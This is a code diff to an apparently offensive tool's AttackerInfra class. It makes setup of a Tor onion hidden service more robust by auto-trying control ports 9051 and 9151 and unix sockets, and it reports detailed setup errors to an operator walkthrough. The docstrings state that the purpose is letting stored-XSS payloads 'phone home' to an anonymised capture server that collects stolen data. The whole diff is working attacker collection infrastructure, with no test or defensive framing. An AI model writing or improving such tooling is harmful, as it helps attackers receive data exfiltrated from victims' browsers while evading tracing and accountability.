@@ -567,6 +567,10 @@ class AttackerInfra:
         self._onion_host = None
         self._hs_controller = None
         self._hs_service_id = None
+        # Last detailed error from start_hidden_service so the
+        # walkthrough UI can display WHY setup failed instead of a
+        # vague 'failed, falling back to local'.
+        self._last_hs_error: Optional[str] = None
         # Per-remote rate buckets
         self._rate_buckets: dict = {}
         self._rate_lock = threading.Lock()
@@ -1014,6 +1018,14 @@ class AttackerInfra:
             HashedControlPassword
         The hidden service is *ephemeral* (no keys on disk) and is destroyed
         automatically when stop() is called or the controller dies.
+
+        Control-port autodetect: a hardcoded default of 9051 meant that
+        every Tor Browser user (bundled tor runs on 9151) got a silent
+        failure the first time they tried onion mode, fell through to
+        'local', and then wondered why their stored-xss payloads never
+        phoned home. We now try the caller-supplied port first (9051 by
+        default), AND 9151, AND the local tor control unix socket if
+        one is readable.
         """
         if self._onion_host:
             return self._onion_host
@@ -1022,12 +1034,50 @@ class AttackerInfra:
         try:
             from stem.control import Controller
         except ImportError:
+            self._last_hs_error = "stem not installed"
             return None
 
         local_port = self._port
-        try:
-            ctrl = Controller.from_port(port=int(control_port))
-        except Exception:
+
+        # Build the list of (label, connector) candidates. First try the
+        # explicit port the caller asked for, then the Tor Browser port
+        # 9151 if it differs, then the well-known unix control sockets.
+        # Each connector is a nullary callable so we don't evaluate the
+        # fallbacks unless the preferred path fails.
+        candidates: List[Tuple[str, Any]] = []
+        _seen_ports: Set[int] = set()
+        for _p in (int(control_port), 9051, 9151):
+            if _p in _seen_ports:
+                continue
+            _seen_ports.add(_p)
+            candidates.append((f"tcp:127.0.0.1:{_p}",
+                               lambda p=_p: Controller.from_port(
+                                   address="127.0.0.1", port=p)))
+        for _sock in ("/var/run/tor/control", "/run/tor/control",
+                      "/var/lib/tor/control"):
+            if Path(_sock).exists():
+                candidates.append(
+                    (f"unix:{_sock}",
+                     lambda s=_sock: Controller.from_socket_file(s)))
+
+        ctrl = None
+        _reached_via = None
+        _errors: List[str] = []
+        for label, connector in candidates:
+            try:
+                ctrl = connector()
+                _reached_via = label
+                break
+            except Exception as _conn_err:
+                _errors.append(f"{label}: {type(_conn_err).__name__}")
+                ctrl = None
+        if ctrl is None:
+            # Record for the caller so the walkthrough UI can show what
+            # we tried, instead of a vague 'setup failed'.
+            self._last_hs_error = (
+                "couldn't connect to tor control port; tried "
+                + "; ".join(_errors)
+            )
             return None
 
         try:
@@ -1036,7 +1086,13 @@ class AttackerInfra:
                     ctrl.authenticate(password=control_password)
                 else:
                     ctrl.authenticate()
-            except Exception:
+            except Exception as _auth_err:
+                self._last_hs_error = (
+                    f"tor control at {_reached_via} refused authentication "
+                    f"({type(_auth_err).__name__}). "
+                    f"If you set HashedControlPassword in torrc, export "
+                    f"TOR_CONTROL_PASSWORD=<plaintext> before launching."
+                )
                 try:
                     ctrl.close()
                 except Exception:
@@ -1051,7 +1107,13 @@ class AttackerInfra:
                     await_publication=True,
                     detached=False,
                 )
-            except Exception:
+            except Exception as _svc_err:
+                self._last_hs_error = (
+                    f"create_ephemeral_hidden_service via {_reached_via} "
+                    f"failed ({type(_svc_err).__name__}: {str(_svc_err)[:80]}). "
+                    f"Likely cause: tor was built without HiddenService support, "
+                    f"or the control user isn't allowed to create ADD_ONION."
+                )
                 try:
                     ctrl.close()
                 except Exception:
@@ -1060,6 +1122,7 @@ class AttackerInfra:
 
             service_id = getattr(svc, "service_id", None)
             if not service_id:
+                self._last_hs_error = "ADD_ONION succeeded but service_id was empty"
                 try:
                     ctrl.close()
                 except Exception:
@@ -1069,8 +1132,10 @@ class AttackerInfra:
             self._hs_controller = ctrl
             self._hs_service_id = service_id
             self._onion_host = f"{service_id}.onion"
+            self._last_hs_error = None
             return self._onion_host
-        except Exception:
+        except Exception as _outer_err:
+            self._last_hs_error = f"unexpected: {type(_outer_err).__name__}"
             try:
                 ctrl.close()
             except Exception:
@@ -1109,6 +1174,12 @@ class AttackerInfra:
     @property
     def port(self) -> Optional[int]:
         return self._port
+
+    @property
+    def last_hidden_service_error(self) -> Optional[str]:
+        """Detailed reason the most recent start_hidden_service() call
+        returned None, or None if it succeeded / was never called."""
+        return self._last_hs_error
 
     def stop(self):
         """Stop server, close socket, tear down hidden service, wipe captures."""
@@ -2796,9 +2867,15 @@ def _walkthrough_main(exploitable, vulns, tor_proxy, auto_mode,
             # internet can't hit 127.0.0.1. Previously the operator
             # would learn this only when captures never arrived. Make
             # them consciously opt out of onion mode.
-            err("Hidden service setup FAILED. Likely reasons:")
+            err("Hidden service setup FAILED.")
+            _hs_detail = server.last_hidden_service_error
+            if _hs_detail:
+                err(f"  detail: {_hs_detail}")
+            err("Likely reasons:")
             err("  * Tor ControlPort not open (add 'ControlPort 9051'")
-            err("    to /etc/tor/torrc and restart tor)")
+            err("    to /etc/tor/torrc and restart tor). If you use Tor")
+            err("    Browser instead of system tor, its control port is")
+            err("    9151 — this script auto-tries both 9051 and 9151.")
             err("  * Neither CookieAuthentication nor HashedControlPassword")
             err("    is configured (add 'CookieAuthentication 1' to torrc,")
             err("    or set TOR_CONTROL_PASSWORD env before launching).")
